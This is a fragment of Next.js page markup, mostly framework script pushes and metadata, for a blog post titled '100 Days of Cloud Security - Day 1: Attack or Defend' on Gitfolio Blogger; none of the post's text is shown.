prose-a:text-primary\",\"dangerouslySetInnerHTML\":{\"__html\":\"$13\"}}]]}]\n"])</script><script>self.__next_f.push([1,"d:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n9:null\n"])</script><script>self.__next_f.push([1,"14:I[622,[],\"IconMark\"]\nb:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"100 Days of Cloud Security - Day 1: Attack or Defend | Gitfolio Blogger\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Day 1 of my cloud security journey - Attack or Defend\"}],[\"$\",\"link\",\"2\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"32x32\"}],[\"$\",\"$L14\",\"3\",{}]],\"error\":null,\"digest\":\"$undefined\"}\n"])</script><script>self.__next_f.push([1,"10:\"$b:metadata\"\n"])</script></body></html>